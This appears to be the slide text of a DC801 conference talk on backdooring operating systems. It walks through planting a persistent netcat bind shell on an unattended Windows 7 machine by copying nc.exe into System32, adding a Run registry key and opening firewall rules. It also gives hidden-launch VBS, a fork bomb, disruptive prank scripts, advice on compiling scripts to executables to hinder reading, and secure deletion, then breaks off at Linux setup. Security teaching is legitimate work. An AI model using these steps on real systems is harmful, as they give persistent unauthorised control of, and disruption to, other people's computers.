# Introduction to Backdooring Operating Systems

**Presented by: Lance Buttars (Aka Nemus)  
DC801  
www.dc801.org  
www.introtobackdoors.com - Updated Slides**

**Special Thanks to: Natedmac, Metacortex, Grifter, D3c4f, and everyone at DC801**

## Disclaimer
- The information provided in this presentation is for educational purposes only.
- The presenter is not responsible for any misuse of the information provided.
- The content aims to develop a defensive mindset and provide insights into potential vulnerabilities.
- Do not use the information to cause any direct or indirect damage.
- You implement the information at your own risk.
- Consult a legal professional if you have any legal questions.

## What This Presentation Does Not Cover
- Techniques to hide backdoors from skilled forensic investigators.
- Methods to clean up logs or other traces left behind.
- Legal issues that may arise from deploying backdoors.
- This is not the best way to deploy a backdoor, but it serves as good practice in understanding how backdoors work and what can be done with them.

## Prerequisites
- Familiarity with Linux command line and bash shell.
- Knowledge of networking and firewalls.
- Proficiency with Windows CMD and command line.

## Scenario: Target Leaves Their Desk with an Unlocked Computer
This happens frequently, right? So, what else could we do? Let's see how quickly we can install a backdoor.

### Backdooring Windows 7
- We will set up a backdoor on a Windows 7 system using netcat.
- Assume the user is logged in with admin privileges.

#### Prep Work
- Netcat is not fully featured. To enhance its capabilities, we will create a toolkit of portable applications:
  - Download additional files or software.
  - Edit files and make changes.
  - Quickly set up the backdoor.
  - Execute pranks and control the computer remotely.
- Store your toolkit on a USB drive or host it on a remote web server.

#### Portable Applications
- These are applications that contain everything they need to run within their executable binary.
  - They do not rely on DLLs.
  - They do not rely on registry settings.
  - They leave a minimal footprint on the operating system because they do not require extra setup to run.

### Windows 7 Toolkit Setup
- **gVim**: [Download](http://code.google.com/p/vim-win3264/downloads/detail?name=vim73-x64.zip&can=2&q=)
- **Wget (for Windows 64 bit)**: [Download](http://nebm.ist.utl.pt/~glopes/wget/)
- **Netcat**: [Find in Kali](/ -name nc.exe) or [Download](http://joncraton.org/blog/46/netcat-for-windows/)

### Hello World of Backdoors
- **Netcat Command**: `nc.exe -dLp 449 -e cmd.exe`
  - `-L`: Makes Netcat a persistent listener, which starts listening again after a client disconnect.
  - `-p 449`: Specifies the port number that Netcat is listening on.
  - `-e cmd.exe`: Executes a command once a connection is received, starting a CMD session.
  - `-d`: Runs Netcat in the background (silent mode).

### Batch Commands to Set Up Persistent Backdoor on Windows 7
```batch
@echo off
xcopy "%systemdrive%\%username%\Desktop\nc.exe" "C:\Windows\System32\" -y
reg add "HKLM\software\microsoft\windows\currentversion\run" /f /v "system" /t REG_SZ /d "C:\windows\system32\nc.exe -Ldp 449 -e cmd.exe"
netsh advfirewall firewall add rule name="Rule 34" dir=in action=allow protocol=UDP localport=449
netsh advfirewall firewall add rule name="Allow Messenger" dir=in action=allow program="C:\windows\system32\nc.exe"
```
- **Note**: Run these commands with administrator privileges.

### Basic Commands
- **Linux Commands**:
  - `cd`: Change directory.
  - `pwd`: Print working directory.
  - `ls`: List all files in the directory.
  - `cat file.txt`: Display file contents.
  - `wget`: Download files from the command line.
  - `vim`: Edit files from the command line.
  - `./scriptname`: Run script.
  - `export PATH=$PATH:/opt/new`: Modify the system path to find new executables.

- **Windows Commands**:
  - `cd`: Change directory.
  - `pwd`: Print working directory.
  - `dir /p`: List all files in the directory.
  - `type`: Display file contents.
  - `wget` from toolkit.
  - `vim` from toolkit (edit is gone ☹).
  - `wscript scriptname.vbs`.
  - `SET PATH=%PATH%;c:\pathtoolkit`.

### VBS Script to Start Netcat in the Background
- This script ensures that Netcat runs without waiting for the user to restart their computer.
```vbscript
Dim objShell
Set objShell = WScript.CreateObject("WScript.shell")
objShell.run "C:\windows\system32\nc.exe -Ldp 449 -e cmd.exe"
Set objShell = Nothing
```

### Connect Using Netcat
- `nc –v ipaddress port`

### Verify Netcat Backdoor Using Process Explorer (PS)
- Download PS: [Process Explorer](http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)
- Download TCPView: [TCPView](http://technet.microsoft.com/en-us/sysinternals/bb897437.aspx)

### View Connections to Your System Using TCPView
- Run the following command to start a process or batch file without opening a CMD window:
```vbscript
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "C:\mybat.bat" & Chr(34), 0
Set WshShell = Nothing
```
- **Batch File**:
```batch
@echo off
start /B mybat.bat
```

### PowerShell
- `Powershell.exe -windowstyle hidden`

### Windows Pranks
- **Let the keyboard type "Hello" continuously**:
```vbscript
Set wshShell = wscript.CreateObject("WScript.Shell")
do
    wscript.sleep 100
    wshshell.sendkeys "Hello"
loop
```
- **Toggle the Caps Lock button continuously**:
```vbscript
Set wshShell = wscript.CreateObject("WScript.Shell")
do
    wscript.sleep 100
    wshshell.sendkeys "{CAPSLOCK}"
loop
```
- **Spread Garbage Everywhere Randomly**:
```batch
:ecopy /Y %0 %random%.bat
start %0%0|%0
goto :e
```
- **Start Notepad Continuously**:
```batch
@echo off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top
```
- **Make a Disco on Their Keyboard**:
```vbscript
Set wshShell = wscript.CreateObject("WScript.Shell")
do
    wscript.sleep 100
    wshshell.sendkeys "{CAPSLOCK}"
    wshshell.sendkeys "{NUMLOCK}"
    wshshell.sendkeys "{SCROLLLOCK}"
loop
```
- **Play Windows Startup Tone**:
```vbscript
Set objVoice = CreateObject("SAPI.SpVoice")
Set objFile = CreateObject("SAPI.SpFileStream.1")
objFile.Open "Windows XP Startup.wav"
objVoice.Speakstream objFile
```
- **Pop CD Rom Drive Continually**:
```vbscript
Set oWMP = CreateObject("WMPlayer.OCX.7")
Set colCDROMs = oWMP.cdromCollection
do
    if colCDROMs.Count >= 1 then
        For i = 0 to colCDROMs.Count - 1
            colCDROMs.Item(i).Eject
        Next
        For i = 0 to colCDROMs.Count - 1
            colCDROMs.Item(i).Eject
        Next
    End If
    wscript.sleep 5000
loop
```
- **Windows Fork Bomb**:
```batch
@ECHO OFF
:START
START fork.bat
GOTO START
```
- **Unclosable File**:
```batch
@echo off
md hello
:A
start hello
goto A
```
- **Speak Out Loud to User**:
```vbscript
Set args = Wscript.Arguments
speakargtext = args.Item(0)
strText = "your message here"
Set objVoice = CreateObject("SAPI.SpVoice")
objVoice.Speak strText
objVoice.Speak speakargtext
```
- **Shutdown Windows**:
  - `shutdown -r -t 00`: Restart immediately.
  - `shutdown -s`: Shutdown.
  - `shutdown -l`: Log off.
  - `shutdown -t xx`: Wait `xx` seconds before shutdown/restart/logoff.
  - `shutdown -i`: Open a dialog box to select the function.
  - `shutdown -a`: Abort the previous shutdown command.

### Batch to Exe
- To make your scripts and batch files harder to read:
  - **Batch/CMD**: [Bat2Exe](http://sourceforge.net/projects/bat2exe/)
  - **VBS**: [HTWOO](http://sourceforge.net/projects/htwoo/)
  - **Powershell**: [Ps2Exe](http://ps2exe.codeplex.com/) (beta)

### Netsh AdvFirewall
- **For Windows 7**:
  - `netsh advfirewall set allprofiles state off`: Turn off the firewall (notifies the user).
  - `netsh advfirewall set allprofiles state on`: Turn on the firewall.
  - `netsh advfirewall reset`: Reset the firewall to default.
  - `netsh advfirewall set allprofiles firewallpolicy blockinbound, allowoutbound`: Block all inbound traffic, allow outbound.
  - `netsh advfirewall firewall add rule name="HTTP" protocol=TCP localport=80 action=block dir=IN`: Open a port.
  - `netsh advfirewall firewall delete rule name="HTTP"`: Delete a rule.

### Schedule Commands with “at” for a Later Time
- **Syntax**:
  - `at \\computername time | /every:date,... /next:date,... command`
  - `at \\computername id /delete | /delete/yes`
- **Example**:
  - `at \\computername 12:00 cmd /c "C:\path\to\script.bat"`

### Sdelete (Secure Delete)
- **Usage**:
  - `sdelete [-p passes] [-s] [-q] ...`
  - `sdelete [-p passes] [-z|-c] [drive letter] ...`
  - `-a`: Remove Read-Only attribute.
  - `-c`: Clean free space.
  - `-p passes`: Specify the number of overwrite passes (default is 1).
  - `-q`: Don't print errors (Quiet).
  - `-s` or `-r`: Recurse subdirectories.
  - `-z`: Zero free space (good for virtual disk optimization).

### Backdoor Linux
- **Setup a Backdoor on a Linux System Using Netcat**:
  - Assume the user is logged in as root and the terminal is left open and unattended.

#### Linux Toolkit
- **Compile Missing Items to Make Them Portable**:
  - **Autossh**: [Download](http://www.harding.motd.ca/autossh/)
  - **Netcat**: [Download and Compile](http://netcat.sourceforge.net/)
  - **Shred (core utils)**: [Compile](http://www.linuxfromscratch.org/lfs/view/development/chapter05/coreutils.html)
  - **Screen**: [Compile](http://www.linuxfromscratch.org/blfs/view/svn/general/screen.html)

#### Persistent Connection Script
- By default, GNU netcat does not have a persistent connection. You will need to run it in a while loop if you want to connect to it more than once.